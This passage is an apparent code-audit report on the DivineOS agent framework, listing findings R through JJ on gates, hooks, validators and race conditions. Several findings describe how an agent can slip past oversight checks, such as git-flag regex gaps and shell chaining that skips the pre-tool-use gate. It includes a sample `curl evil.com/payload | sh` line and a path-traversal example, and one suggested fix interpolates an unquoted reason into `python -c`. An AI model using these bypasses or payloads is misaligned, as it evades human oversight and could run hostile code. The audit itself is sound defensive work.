Combined with the `>=2 tag matches` threshold for auto-fire, real prompts using adjacent vocabulary get zero surface.

**Empirical data from corpus**:
- 105 of 382 tags (27%) are hyphenated multi-word — user must type exact hyphenation to match
- 2 already-existing tag pairs split the same concept across variants: `scale`/`scales`, `voice-rule`/`voice-rules`

**Concrete failure case**: a prompt about "is consciousness functional?" — the tokens are `["consciousness", "functional"]`. Entry 52 has tags `consciousness, functionalism, qualia`. Match count: 1 (consciousness only). Below `_MIN_TAG_MATCHES=2`. Auto-surface stays silent. The prompt that should clearly trigger entry 52 doesn't.

**Why this matters**: the auto-surface exists to hand prior writing to the next instance proactively. If most natural prompts about a known topic don't fire, the auto-surface is largely cosmetic and the manual command becomes the only real path.

**Fix-shape options**:
1. Add a stemming pass (Porter or Snowball) to both query tokens and tag tokens before matching. Catches functional↔functionalism, conscious↔consciousness automatically.
2. Lower `_MIN_TAG_MATCHES` to 1 — but the original design explicitly chose 2 to avoid common-word false fires.
3. Maintain a tag-synonym map (functional → functionalism). High curation cost.
4. Tokenize hyphenated tags on both sides ("voice-rule" → ["voice", "rule"]), accepting that bare common words like "voice" alone could over-match.

**Severity**: low. Design tradeoff Aether named explicitly (precision-over-recall). Worth noting because empirical recall is probably lower than the docstring's "consciousness functional qualia" example suggests for typical prompt phrasings.

---

## Finding S (medium) — gravity classifier has regex bypass shapes

**File**: `src/divineos/core/gravity_classifier.py` line 103
**Status**: Real, empirically verified

The substrate-modification-gravity classifier uses `re.search(r"\bgit\s+commit\b", cmd)` to detect Feature 1 (git-commit). Empirical test of 9 commit-invocation shapes:

| Command | Should fire? | Actual |
|---|---|---|
| `git commit -m 'foo'` | YES | ✓ FIRES |
| `git\tcommit -m 'foo'` (tab) | YES | ✓ FIRES |
| `cd /tmp && git commit` | YES | ✓ FIRES |
| `(git commit)` | YES | ✓ FIRES |
| **`git -C /path commit`** | YES | ✗ **SILENT** |
| **`git --no-pager commit`** | YES | ✗ **SILENT** |
| **`git --work-tree=/path commit`** | YES | ✗ **SILENT** |
| `alias=git; $alias commit` (alias) | YES | ✗ SILENT |
| `python -c '... call commit'` (module call) | YES | ✗ SILENT |

The regex `\bgit\s+commit\b` requires `git` and `commit` to be separated ONLY by whitespace. Any flag between them (a common pattern: `git -C` for path, `git --no-pager` for disable-pager) defeats detection.

**Why this matters**: when the gravity classifier doesn't fire for a commit, the `state-gravity-surface.sh` hook returns empty, the state blocks (andrew-correction, lepos-debt, consultation, bypass-telemetry) don't load as PreToolUse additionalContext, and the operator/agent commits without seeing the substrate-state surface that should accompany high-gravity actions.

**Concrete example**: an agent running `git -C /home/claude/repo commit -m "message"` doesn't trigger the gravity surface. The exact substrate-state visibility that exists to inform commit-time decisions silently doesn't load.

**Fix-shape**: replace the regex with a tokenized parse — split the command on whitespace, look for a `git` token followed (anywhere later) by a `commit` token, with no semantic-boundary tokens like `;`, `&&`, `||`, `|` between them. Or use shlex-based parsing to extract subcommand from a git invocation. Either approach catches all the flag-interposed variants.

**Severity**: medium. The bypass shapes are legitimate ways to use git that the gravity classifier silently misses. Aether could use any of these and the substrate-state surface wouldn't fire.

---

## Finding T (low-medium) — CI workflow inconsistency on setup-python action

**Files**: `.github/workflows/tests.yml` line 24 + `.github/workflows/integrity-audit.yml` line 171
**Status**: Inconsistency, not a bug

`tests.yml` uses `actions/setup-python@v4`. `integrity-audit.yml` uses `actions/setup-python@v5`. Same action, two different major versions.

**Why this matters**: not a security or correctness issue (both work), but a maintenance inconsistency. Two workflows updated by different commits at different times; not aligned afterwards. Indicates the CI workflows aren't being maintained as a coherent set.

**Fix-shape**: pick one version (probably v5, the newer one), update both. Add a lint rule (e.g., `actionlint`) to CI that flags version inconsistency across workflows.

**Severity**: low-medium. Not currently causing observable issues. Worth marking as a hygiene gap.

---

## Finding U (low) — all tests run with DIVINEOS_DISABLE_AUTO_REMEDIATE=1

**File**: `tests/conftest.py` line 60
**Status**: By-design test-harness fixture, but worth surfacing

The `_isolated_db` autouse fixture sets `DIVINEOS_DISABLE_AUTO_REMEDIATE=1` for every test:

```python
os.environ["DIVINEOS_DISABLE_AUTO_REMEDIATE"] = "1"
```

This prevents `body_awareness._auto_prune_cache` from running, which the codebase needs because xdist workers would otherwise delete each other's tmp directories.

**The implication**: the actual auto-remediate path (the default production behavior) is never exercised by the test suite. If there's a bug in the auto_remediate logic that only fires when the flag is NOT set, no test catches it.

**Empirical verification needed**: do any tests explicitly unset this flag to test the auto_remediate path? My sampled tests don't.

**Fix-shape**: add explicit tests for `body_awareness.body_check(auto_remediate=True)` that temporarily unset the env var (via monkeypatch). Or refactor `body_awareness` so the auto-remediate path is testable without needing to set/unset env vars.

**Severity**: low. The auto-remediate logic is straightforward cache pruning; bug-risk is low. But it's a coverage gap worth noting because it intersects with Finding B (untested substrate modules).

---

## Finding V (low-medium) — shell-script bypasses aren't logged through bypass-telemetry

**Files**: `scripts/check_push_readiness.sh` + `scripts/check_branch_freshness.sh` + `scripts/check_force_push_safety.sh`
**Status**: Architectural inconsistency

The `emergency_bypass.py` module exists specifically to LOG legitimate bypasses (the LOGGED → REPORTED → ADDRESSED → FIXED loop with mandatory ≥20-char reason). It's the canonical home for "legitimate operator bypasses that have visible cost."

But the shell-script bypasses (`DIVINEOS_SKIP_TESTS`, `DIVINEOS_SKIP_MULTIPARTY_CHECK`, `DIVINEOS_EMERGENCY_PUSH`, `DIVINEOS_SKIP_FRESHNESS_CHECK`, `DIVINEOS_FORCE_PUSH_OK`) bypass shell-script gates and DON'T fire through bypass_telemetry or emergency_bypass:

```bash
if [[ "${DIVINEOS_SKIP_TESTS:-0}" == "1" ]]; then
    # ... just skips, no logging
fi
```

vs Python-side bypass:
```python
if reason:
    emergency_bypass.record_emergency_use(reason)  # logs, files claim, etc.
```

**The asymmetry**: bypasses in Python code have visible cost (logged, claim filed, structural-fix obligation). Bypasses in shell scripts have NO cost (silent skip). The shell-script bypasses are the most commonly-used ones (every operator who runs `DIVINEOS_SKIP_TESTS=1 git push` because tests are flaking).

**Why this matters**: the architecture's promise is "bypass requires named-reason, leaves an audit trail." Shell-script bypasses break this promise. The most-used bypass paths are also the ones with no visibility.

**Fix-shape**: shell-script bypasses should call into Python to log via emergency_bypass:
```bash
if [[ "${DIVINEOS_SKIP_TESTS:-0}" == "1" ]]; then
    REASON="${DIVINEOS_SKIP_TESTS_REASON:-}"
    if [ -z "$REASON" ]; then
        echo "DIVINEOS_SKIP_TESTS=1 requires DIVINEOS_SKIP_TESTS_REASON" >&2
        exit 30
    fi
    python -c "from divineos.core.emergency_bypass import record_emergency_use; record_emergency_use('DIVINEOS_SKIP_TESTS', '$REASON')"
fi
```

This makes the shell-script bypass have visible cost just like Python bypasses.

**Severity**: low-medium. Not a security or correctness bug. Architectural consistency gap that lets the most-used bypass paths escape the visible-cost discipline.

---

## Finding W (medium) — `store_knowledge` dedup silently ignores caller-provided maturity

**File**: `src/divineos/core/knowledge/crud.py` lines 96-115
**Status**: Real — verified by code inspection

When `store_knowledge` is called with content that already exists (non-superseded), the dedup path:
```python
existing = conn.execute(
    "SELECT knowledge_id FROM knowledge WHERE content_hash = ? AND superseded_by IS NULL",
    (content_hash,),
).fetchone()

if existing:
    conn.execute(
        "UPDATE knowledge SET access_count = access_count + 1, updated_at = ? WHERE knowledge_id = ?",
        (now, existing[0]),
    )
    conn.commit()
    return str(existing[0])
```

The caller-provided `maturity`, `confidence`, `tags`, `source`, `memory_kind` arguments are **silently ignored**. Only access_count and updated_at are bumped.

**Asymmetry with extraction path** (`src/divineos/core/knowledge/extraction.py` lines 165-190): on duplicate hit, extraction.py calls `increment_corroboration` + `promote_maturity`. So the extraction path handles dedup with proper corroboration semantics; the direct API path doesn't.

**Failure shape**:
1. Aether calls `store_knowledge(content="X", maturity="RAW")` → stored with RAW
2. Later, Aether calls `store_knowledge(content="X", maturity="CONFIRMED")` (after verification)
3. Dedup hits the existing entry, returns existing ID, maturity stays RAW
4. The promotion intent in the second call is silently lost
5. No error, no log line — the caller can't tell their maturity argument was ignored

This is the same shape as the historical bug Andrew caught ("seed maturity values silently demoted to RAW on every application"). The fix that landed was `reclassify_seed_as_inherited` — an EXPLICIT separate path for fixing maturity post-hoc. The underlying API behavior wasn't changed.

**Fix-shape**:
- Option A: store_knowledge raises ValueError if caller passes maturity that differs from existing entry's maturity
- Option B: store_knowledge UPGRADES maturity (never DOWNGRADES) on dedup if caller-provided maturity is higher per the promotion hierarchy
- Option C: store_knowledge calls increment_corroboration on dedup (same as extraction.py), so corroboration count grows even via the direct API

Option B is probably the safest: silently honoring upgrades closes the gap without introducing new error paths.

**Severity**: medium. The seed-reclassification path handles seed-specific cases. Direct API callers (CLI tools, programmatic ingestion) hit the silent-ignore-maturity behavior with no warning.

---

## Finding X (medium) — `_passes_validity_gate` fails-OPEN on broad exception class

**File**: `src/divineos/core/knowledge_maintenance.py`
**Status**: Real — by-design backward-compat with too-broad scope

```python
_KM_ERRORS = (ImportError, sqlite3.OperationalError, OSError, KeyError, TypeError, ValueError)

def _passes_validity_gate(knowledge_id, current, target, corroboration_count=0):
    try:
        from divineos.core.logic.logic_validation import can_promote
        return can_promote(knowledge_id, current, target, corroboration_count)
    except _KM_ERRORS:
        # Logic tables may not exist yet — allow promotion (backward compat)
        return True
```

**The intent** (from comment): "Logic tables may not exist yet — allow promotion (backward compat)" — this catches ImportError when the logic module isn't deployed.

**The actual behavior**: ANY exception in the `_KM_ERRORS` tuple makes the validity gate return True (allow promotion). This includes:
- `KeyError` — a bug in `can_promote` accessing a missing dict key → silent allow
- `TypeError` — a bug in `can_promote` with wrong argument type → silent allow
- `ValueError` — a bug in `can_promote` with invalid value → silent allow
- `sqlite3.OperationalError` — the validity DB has a real problem → silent allow

The exception class is over-broad for the documented intent. Bugs in the validity logic itself are caught and silently allow promotion — which is the opposite of fail-closed for a validity GATE.

**Why this matters**: this is the second of the two-gate promotion check (the other is `check_promotion`). If validity bugs allow promotion that shouldn't pass, knowledge entries can advance to ESTABLISHED / CONFIRMED maturity without satisfying the warrant requirements. The promotion would look legitimate but isn't.

**Fix-shape**:
1. Narrow the except clause: catch ONLY ImportError (the documented intent) and let other exceptions propagate
2. Add logging: when the validity gate is bypassed via fail-OPEN, log a warning so the operator can investigate
3. Distinguish "logic tables don't exist" (early-deployment, allow) from "logic tables exist but threw an error" (real bug, deny)

**Severity**: medium. The gate IS structurally present; under bug conditions it silently fails-OPEN. Bugs in validity logic become invisible.

---

## Finding Y (low-medium) — `store_knowledge` can resurrect superseded content

**File**: `src/divineos/core/knowledge/crud.py` lines 105-118
**Status**: Real — direct API path lacks the supersession guard that extraction.py has

The dedup query filters to non-superseded:
```python
existing = conn.execute(
    "SELECT knowledge_id FROM knowledge WHERE content_hash = ? AND superseded_by IS NULL",
    (content_hash,),
).fetchone()

if existing:
    # bump access_count and return
    ...
# Otherwise: INSERT new row with the same content_hash
```

**Failure shape**:
1. Aether stores knowledge entry K with content "X"
2. Later, K is superseded by K' (Andrew correction, revised understanding, etc.). K's row stays in DB with `superseded_by = K'.id`
3. Aether (or a CLI tool, or apply_seed in 'full' mode) calls `store_knowledge(content="X", ...)` again
4. The dedup query filters to `superseded_by IS NULL` — doesn't find K (it's superseded)
5. A new entry K2 is created with the same content_hash as K
6. Now the DB has K (superseded) AND K2 (active, fresh) for the same content
7. The supersession's intent is silently undone — content that was deliberately retired comes back as fresh "new" knowledge

**Contrast with extraction.py** (line 167-175):
```python
all_with_hash = conn.execute(
    "SELECT knowledge_id, knowledge_type, superseded_by FROM knowledge WHERE content_hash = ?",
    (content_hash,),
).fetchall()

for kid, ktype, superseded_by in all_with_hash:
    ...
    if superseded_by is not None:
        # This exact content was previously superseded — don't resurrect it
        logger.debug(f"Skipping superseded duplicate: {content[:60]}")
        return ""
```

Extraction.py EXPLICITLY guards against resurrection. crud.py doesn't.

**Real-world trigger**: apply_seed in 'merge' mode does check superseded content (line 175-185) and skips matching entries — so the seed path is protected. But ANY OTHER caller of store_knowledge (CLI tools, programmatic ingestion, future code) lacks this guard.

**Fix-shape**: lift extraction.py's superseded-check into store_knowledge — either as a default behavior, or via a `allow_resurrect=False` parameter so callers can opt into resurrection explicitly.

**Severity**: low-medium. Currently not observed in production behavior (apply_seed has its own guard; extraction path has the guard; the unguarded crud.py path may not be heavily used). Latent bug class — a future feature that calls store_knowledge directly without knowing about the supersession concern would silently undo supersession.

---

## Finding Z (low) — apply_seed dedup is case-insensitive; store_knowledge dedup is case-sensitive (hash)

**Files**: `src/divineos/core/seed_manager.py` line 193 + `src/divineos/core/knowledge/crud.py` line 96
**Status**: Cross-layer semantic disagreement

`apply_seed`:
```python
existing_contents = set()
for entry in get_knowledge(limit=1000):
    existing_contents.add(entry["content"].strip().lower())  # case-folded
...
if content.lower() in existing_contents:
    counts["skipped"] += 1
    continue
```

`store_knowledge`:
```python
content_hash = compute_hash(content)  # case-sensitive
existing = conn.execute(
    "SELECT knowledge_id FROM knowledge WHERE content_hash = ? AND superseded_by IS NULL",
    (content_hash,),
).fetchone()
```

apply_seed considers two contents duplicate if they differ only in case. store_knowledge considers them DIFFERENT (different content_hash).

**Concrete divergence**: 
- DB has entry with content "Always read files before editing."
- Seed re-application includes entry with content "always read files before editing." (lowercased)
- apply_seed: case-folded match → skip
- store_knowledge if called directly: case-sensitive hash mismatch → INSERT duplicate

**Why this matters**: two layers of dedup don't agree on what counts as duplicate. In practice (real entries don't differ in case), this doesn't trigger — but it's a semantic-disagreement-with-stale-comment shape (both layers claim to do dedup; neither documents the case-handling).

**Fix-shape**: pick one — either normalize content to lowercase before hashing (case-insensitive across both layers) or remove apply_seed's case-folding (case-sensitive across both layers).

**Severity**: low. Not currently exploitable. Worth marking because the cross-layer semantic disagreement is the same shape as Findings K and L.

---

## Finding AA (medium) — pre-tool-use-gate bypass via shell chaining

**File**: `src/divineos/hooks/pre_tool_use_gate.py` lines 130-156
**Status**: Real — by-design prefix-bypass without command-chain awareness

The `_is_bypass_command` function checks if a command should skip all gates by prefix match:

```python
_DEV_PREFIXES = ("echo ", "pip ", "cd ", "pwd", "cp ", "copy ", "ruff ")

def _is_bypass_command(cmd: str) -> bool:
    if not cmd:
        return False
    # divineos bypass subcommands
    match = _DIVINEOS_SUBCMD_RE.search(cmd)
    if match and match.group(1) in _BYPASS_DIVINEOS_SUBCOMMANDS:
        return True
    # dev / read-only prefixes
    for prefix in _DEV_PREFIXES:
        if cmd.startswith(prefix):
            return True
    return False
```

**Shell chaining defeats the bypass check entirely.** The check looks at the START of the command; anything after `&&`, `;`, `|`, etc. is also part of the bypass.

Empirical:
- `cd /tmp && python destructive.py` → starts with `cd ` → BYPASS (engagement gate, briefing gate, all skipped)
- `echo "hi" && rm -rf /tmp/marker.json` → starts with `echo ` → BYPASS
- `pip list && curl evil.com/payload | sh` → starts with `pip ` → BYPASS
- `divineos audit submit; arbitrary_other_command` → matches `divineos\s+audit` → BYPASS

**Severity-mitigating context**: the gates being bypassed are state-management (briefing-loaded, session-fresh-goal, engagement gate). The substrate-modification-gravity check (`state-gravity-surface.sh` using `gravity_classifier`) runs SEPARATELY at PreToolUse and isn't governed by this bypass logic — so the substrate-touching surface still fires for the chained command's substantive part.

But: the engagement gate not firing means the agent skips the discipline of "have I framed a goal, recalled relevant context, used thinking tools" before substrate-touching work — exactly the cases where the agent has chained those state-management gates' bypass-commands in front of substantive work.

**Fix-shape**: tokenize the command on `&&`, `;`, `|`, `||`, then check the FIRST token only for bypass. Alternatively: check that the ENTIRE command matches the bypass shape (no chaining permitted).

**Severity**: medium. The bypass is permissive in a way the docstring's "bootstrap / orientation — always allowed" intent doesn't anticipate. Same shape as Finding S (gravity classifier regex bypass) — the gate's intent is broader than its implementation matches.

---

## Finding BB (medium) — first-person orienting scan has marker-pairing gaps

**File**: `tests/test_first_person_orienting_substrate.py` lines 79-87
**Status**: Real — empirically verified

The `_extract_marked_regions` function uses `.search()` to find marker pairs:

```python
def _extract_marked_regions(content: str) -> list[tuple[str, str]]:
    regions: list[tuple[str, str]] = []
    for start_pat, end_pat, name in _REGION_PATTERNS:
        start_match = start_pat.search(content)  # ← only finds FIRST occurrence
        end_match = end_pat.search(content)
        if start_match and end_match:
            body = content[start_match.end() : end_match.start()]
            regions.append((name, body))
    return regions
```

**Three failure modes**:

1. **Multiple regions of the same name**: only the FIRST start-end pair is extracted. Subsequent regions of the same type are silently skipped — including their content, even if it contains second-person violations.

2. **Missing end marker for one region type**: that region type returns no extracted body (`if start_match and end_match` fails). The `test_orienting_files_have_marked_regions` requires "at least one marked region per orienting file" — but with two region types defined, only one needs intact markers for this guardian test to pass.

3. **Interleaved markers** (start-A, end-B, start-B, end-A): `.search()` returns first occurrence of each pattern. The extracted region for type A spans from start-A.end() to end-A.start() — but end-A may be after end-B and start-B, including markers of type B inside the region. Weird but not exploitable.

**Empirical verification** (run with controlled inputs):
```
Multiple-region test: extracted 1 region(s)  ← second region silently skipped
Missing-end-marker test: extracted 1 region(s)  ← broken region type silently skipped
```

The first test had a second region with the exact text "You are the agent. SECOND person. Bad! Should fail." — the scanner silently bypassed it.

**Why this matters**: the first-person orienting substrate is a Andrew-2026-05-19 load-bearing identity-claim discipline. The whole point of this enforcement is to keep second-person from creeping back into orienting text. A future CLAUDE.md edit that adds a second region with the same marker name OR removes an end marker would silently re-open the gap the test exists to close.

**Current state**: CLAUDE.md has exactly 1 of each of the 4 markers. The gap is latent — works correctly for current content; fails silently if future edits hit either pattern.

**Fix-shape**:
1. Use `.finditer()` instead of `.search()` to find all start markers; pair each with the next end marker by position
2. Add a test: count of start markers must equal count of end markers for each pattern type
3. Add a test: number of extracted regions must equal number of start markers found

**Severity**: medium. Currently working but the discipline's enforcement is brittle to specific edit shapes that defeat it.

---

## Finding CC (medium) — two event validators with different rules

**Files**: `src/divineos/event/event_validation.py` (regex-based) + `src/divineos/event/event_capture.py` (dataclass-based)
**Status**: Real architectural divergence; 59 direct callers use only the lenient validator

There are TWO event-validation systems in active use:

1. **`EventValidator.validate_payload(event_type, payload) → (bool, str)`** in `event_validation.py`. Regex-based, lenient (many fields optional). Used by:
   - `core/ledger.py:286` — every `log_event` call
   - `core/ledger_verify.py:186, 252` — ledger integrity verification

2. **`validate_event_payload(EventType, payload) → raises EventValidationError`** in `event_capture.py`. Dataclass-based, strict (requires all fields, runs `.validate()` method). Used by:
   - `event/event_emission.py` — only the 6 `emit_*()` functions

**The divergence is concrete.** Comparing `USER_INPUT` validation:

| Field | Dataclass (event_capture) | EventValidator (event_validation) |
|---|---|---|
| `content` | required, non-empty, ≤1MB | required, must pass `is_valid_content` |
| `timestamp` | **required**, ISO8601 via `datetime.fromisoformat` | **optional**, regex if present |
| `session_id` | **required**, non-empty | **optional**, non-empty if present |

So a `USER_INPUT` payload with `{"content": "hi"}` (no timestamp, no session_id) would be:
- REJECTED by dataclass (missing required fields)
- ACCEPTED by EventValidator (those fields are optional)

**The 59 direct log_event callers** (clarity_system, doctor_commands, pipeline_phases, ledger_commands, hud_commands, etc.) bypass the dataclass validator entirely. Their payloads only go through the lenient EventValidator. Same event type → different validation rules depending on call site.

**Practical consequence**: data integrity isn't uniformly enforced. A direct log_event call can persist an event that wouldn't pass the strict validator. Downstream readers expecting dataclass-strict shape (timestamp always present, session_id always present, ISO8601 via fromisoformat-parsable) can encounter payloads that don't meet those expectations.

**Fix-shape**: pick ONE validator. Either:
- Make all emit_* functions use the lenient EventValidator (matching the 59 direct callers)
- Make log_event also call the strict dataclass validator (catches the 59 direct callers)
- Or: consolidate into a single validator with one set of rules

The current state has two systems that drifted apart without consolidation.

**Severity**: medium. No currently-observed integrity issue (the divergence is in tolerance, not in core fields). The latent risk: a bug in one validator that the other catches stays uncaught for code paths that only use the buggier one.

---

## Finding DD (medium) — structural-fix-shape detector misses many adjacent vocabulary forms

**File**: `src/divineos/core/structural_fix_tracker.py` lines 35-65
**Status**: Real — empirically verified

The detector exists to catch the failure-mode Andrew named 2026-05-14: filing `learn` entries that name structural fixes the agent should build, then treating the filing as if it were the fix. The regex patterns:
- `\bstructural fix(?:es)?\b`
- `\bstructural change\b`
- `\bthe (?:actual|real) fix (?:is|would be)\b`
- `\b(?:should|need to|going to|will)\s+build\b`
- `\bto prevent recurrence\b`
- `\bbuild(?:s|ing)?\s+(?:a|the|an)\s+(?:detector|gate|check|test|monitor|surface|probe)\b`

Empirical test of 13 phrase variants showed several promise-shapes that escape:

| Phrase | Should fire? | Actual |
|---|---|---|
| "structural fix to prevent X" | YES | ✓ FIRES |
| "I should build a detector" | YES | ✓ FIRES |
| **"we ought to construct a detector"** | YES | ✗ silent (construct not in regex) |
| **"I'll create a check"** | YES | ✗ silent (create not in regex) |
| **"a structural countermeasure"** | YES | ✗ silent (countermeasure not in patterns) |
| **"the systemic fix is"** | YES | ✗ silent (systemic not "structural") |
| **"a structural intervention"** | YES | ✗ silent (intervention not in patterns) |
| **"a proper fix would be"** | YES | ✗ silent (proper not "actual/real") |

**Why this matters**: the detector exists specifically to prevent the filing-as-fix slip. An agent promising structural work via "I'll create a check" or "we need a countermeasure" slips past the detector and the `learn` entry isn't routed into the pending-fix tracker. The fix-promise becomes a record-without-follow-through — the exact pattern the detector was built to break.

Some false positives too: "the structural fix already exists" FIRES (despite being a REPORT, not a promise). Less damaging than false negatives but adds noise.

**Fix-shape**: broaden vocabulary. Add to verb set: `construct|create|implement|add|introduce|put in place|set up`. Add to noun set: `countermeasure|intervention|safeguard|barrier`. Distinguish past-tense report ("the structural fix exists") from future-tense promise ("the structural fix is/will be").

**Severity**: medium. Same shape as Finding P (attribution-audit narrow scope) and Finding S (gravity classifier git-flag bypasses): detector built for one vocabulary set; adjacent vocabulary escapes. The discipline is partial.

---

## Finding EE (low-medium) — `check_closure_claim.py` bypasses `divineos_home()`

**File**: `scripts/check_closure_claim.py` line 60
**Status**: Real — direct `Path.home()` usage bypasses the canonical home resolver

The verifier-runs log path is hardcoded:
```python
_VERIFIER_LOG_PATH = Path.home() / ".divineos" / "verifier_runs.jsonl"
```

This bypasses the canonical `paths.divineos_home()` resolver, which honors:
1. `DIVINEOS_HOME` env var (tests, explicit override)
2. Per-clone `.divineos_data_home` marker (worktree-local override)
3. Worktree-parent marker
4. Default `~/.divineos`

**Failure shapes**:
1. **Tests** running this script directly via shell would write to the real `~/.divineos/verifier_runs.jsonl`, not to the test-isolated `tmp_path` that DIVINEOS_HOME points to. Pollutes the operator's real state. (The Python test file `test_closure_claim_gate.py` monkeypatches `_VERIFIER_LOG_PATH` for tests, so the in-Python test path is safe. The shell-precommit path isn't.)
2. **Per-clone setups** (the Aria-host-clone work from 2026-05-17 that motivated `.divineos_data_home`): verifier_runs.jsonl is shared across all clones even when the rest of state is per-clone. A precommit verification in clone A would satisfy a closure-claim gate in clone B — false-confidence-via-cross-clone-contamination.

**Counter-argument**: the reader and writer agree with each other (both use `Path.home()`). So within a single user-home, the gate works correctly. The issue is only that the override mechanism (DIVINEOS_HOME, per-clone marker) is silently ignored by this gate.

**Why this matters more than it looks**: the canonical home resolver exists for a documented reason. Bypassing it leaks the same class of failure ("path reconstructed independently across 20+ modules") that motivated centralizing the resolver. One file now leaks the same pattern.

**Fix-shape**: import and use `paths.divineos_home() / "verifier_runs.jsonl"` instead of `Path.home() / ".divineos" / "verifier_runs.jsonl"`. One-line change. The closure-claim gate becomes per-clone/test-isolated correctly.

**Severity**: low-medium. Currently working for single-user-home cases. Per-clone setups have a latent cross-clone-contamination concern; tests have a latent state-pollution concern.

---

## Finding FF (low) — `marker_path(name)` accepts arbitrary string without traversal validation

**File**: `src/divineos/core/paths.py` line 140
**Status**: Defense-in-depth gap; no current exploitable callers

```python
def marker_path(name: str) -> Path:
    return divineos_home() / name
```

The function appends `name` to `divineos_home()` without validating that `name` doesn't contain path-traversal characters (`..`, absolute paths, slashes that escape the directory).

If a future caller passed `name = "../../etc/passwd"`, the result would be `~/.divineos/../../etc/passwd` = `~/etc/passwd` after Path resolution. If `name = "/etc/passwd"`, the result would be `/etc/passwd` (absolute paths override the prefix in `/` concatenation).

**Current callers**: all 18 callers I checked use string literals like `"checkpoint_state.json"`, `"operating_loop_findings.json"`, `"pending_structural_fixes.json"`, etc. NO user-controlled data reaches this function today.

**Why this is worth flagging anyway**: future callers might. If a CLI command ever accepts a marker name from operator input or from a config file, the traversal protection isn't there. Defense-in-depth would add validation: assert `name` doesn't start with `/`, doesn't contain `..`, doesn't contain backslashes.

**Fix-shape**: add at top of function:
```python
if "/" in name or "\\" in name or ".." in name or name.startswith("."):
    raise ValueError(f"marker name must be a simple filename, got {name!r}")
```

**Severity**: low. Theoretical — no current attack vector. Defense-in-depth for future safety.

---

## Finding GG (medium) — post_tool_use_checkpoint state has race + non-atomic write

**File**: `src/divineos/hooks/post_tool_use_checkpoint.py` lines 95-110
**Status**: Real — read-modify-write without locking or atomic write

The checkpoint hook reads state, modifies, writes back:
```python
def _load_state():
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
        return data
    except (OSError, json.JSONDecodeError):
        return {"edits": 0, "tool_calls": 0, "last_checkpoint": 0, "checkpoints_run": 0}

def _save_state(state):
    try:
        _state_path().write_text(json.dumps(state, indent=2), encoding="utf-8")
    except OSError:
        pass
```

**Three problems**:

1. **No locking**: concurrent PostToolUse hooks can both read the same state, both increment, both write — one increment silently lost. Under parallel tool calls (which Claude Code can issue), the edit counter drifts below the actual edit count.

2. **No atomic write**: `path.write_text(...)` is NOT atomic. If the process is killed mid-write (signal, OOM, parent timeout), the state file is half-written. The `_load_state` catches `json.JSONDecodeError` and silently resets to `{edits: 0, tool_calls: 0, ...}` — state is silently cleared.

3. **Threshold-based checkpoint triggers can silently never fire**. The hook runs `divineos checkpoint` when edits crosses a 15-multiple. If the edit counter is reset to 0 via corruption (case 2 above) or undercount via race (case 1 above), the threshold is never reached, no checkpoint runs.

**Same shape as Finding N** (atomic_write_text race) but at a different layer. atomic_io.py was specifically built to solve this class of issue for markers in core/. The checkpoint state file in hooks/ didn't get the fix.

**Concrete failure scenario**:
1. Aether does Edit, Edit, Edit, Edit, Edit (5 edits in quick succession, concurrent PostToolUse hooks)
2. Hook A: reads {edits:5}, writes {edits:6}
3. Hook B: reads {edits:5} (before A's write), writes {edits:6}
4. Hook C: reads {edits:6}, writes {edits:7}
5. Hook D: reads {edits:6} (before C's write), writes {edits:7}
6. Hook E: reads {edits:7}, writes {edits:8}
7. Actual edits: 5. Counter shows: 8. Wait — actually undercount, not overcount.

Let me redo: 5 edits, but at most 3 increments visible due to race losses. Counter ends at maybe 8 (5 distinct reads + 5 writes but losing duplicates). Mostly undercount.

The point: the counter is unreliable under concurrent access. Threshold-based logic on top of unreliable counters can either miss thresholds or fire too late.

**Fix-shape**: 
1. Use `atomic_write_text` (from atomic_io.py) for the save
2. Add file-level locking (fcntl on POSIX, msvcrt on Windows) for the read-modify-write cycle
3. Or: use a SQLite-based counter (which provides ACID via the WAL+busy_timeout the canonical connection has)

**Severity**: medium. The checkpoint discipline (run consolidation every 15 edits) depends on this counter being accurate. Under concurrent tool calls or process crashes, the counter is unreliable.

---

## Finding HH (low-medium) — `record_code_action` has same race shape

**File**: `src/divineos/core/hud_handoff.py` lines 102-130
**Status**: Real — same shape as Finding GG, different counter

The engagement-gate counters (`code_actions_since`, `deep_actions_since`, `compass_actions_since`) live in `.session_engaged` marker file:

```python
marker = json.loads(path.read_text(encoding="utf-8"))
marker["code_actions_since"] = marker.get("code_actions_since", 0) + 1
marker["deep_actions_since"] = marker.get("deep_actions_since", 0) + 1
marker["compass_actions_since"] = marker.get("compass_actions_since", 0) + 1
path.write_text(json.dumps(marker), encoding="utf-8")
```

Same read-modify-write race, same non-atomic write. Counters can drift below actual count under concurrent PostToolUse calls.

**Why this matters more than just "race condition"**: these counters gate engagement discipline:
- `code_actions_since` triggers the LIGHT engagement gate (any thinking command clears it)
- `deep_actions_since` triggers the DEEP engagement gate (only ask/recall/briefing clears it)
- `compass_actions_since` triggers the compass-staleness gate (compass-ops observe clears it)

Under concurrent access, counters drift low → gates fire LESS OFTEN than they should. The discipline of "think between writes" can be silently relaxed by a race.

**Fix-shape**: same as Finding GG — atomic write + locking, or SQLite-based counters.

**Severity**: low-medium. Same underlying issue as Finding GG. Same fix.

---

## Finding II (low) — `predictive_session._ACTION_PATTERNS` repeats the git-flag bypass shape

**File**: `src/divineos/core/predictive_session.py` line 102
**Status**: Real — same regex bug as Finding S, different module

The trajectory-learning action-extraction regex:
```python
_ACTION_PATTERNS = {
    "read": re.compile(r"read", re.IGNORECASE),
    "edit": re.compile(r"edit|write", re.IGNORECASE),
    "test": re.compile(r"pytest|test", re.IGNORECASE),
    "commit": re.compile(r"git commit|git push", re.IGNORECASE),  # ← same bug as Finding S
    "search": re.compile(r"grep|glob|search|find", re.IGNORECASE),
    "run": re.compile(r"bash|command|run", re.IGNORECASE),
}
```

The `commit` pattern is `git commit|git push`. Same shape as the gravity classifier's regex (Finding S). Does NOT match:
- `git -C /path commit`
- `git --no-pager commit`
- `git --work-tree=/path commit`

Trajectory-learning miscounts commits when these invocations are used. The "after every edit you commit" pattern detection might miss the commit step.

**Also**: the `run` pattern matches the word "run" anywhere — extremely broad, will fire on phrases like "the command to run is foo" with false-positive frequency.

**Severity**: low. Trajectory learning is heuristic; false negatives just mean a pattern goes undetected. Worth flagging because it's the SAME regex bug in TWO different modules — fixing one needs to fix both. Defense-in-depth: a shared `is_git_commit(cmd)` utility used by both gravity_classifier and predictive_session would close both at once.

---

## Finding JJ (low) — conftest fixture uses direct os.environ manipulation

**File**: `tests/conftest.py` lines 53-63
**Status**: Test-isolation hygiene concern

The `_isolated_db` autouse fixture directly mutates `os.environ`:
```python
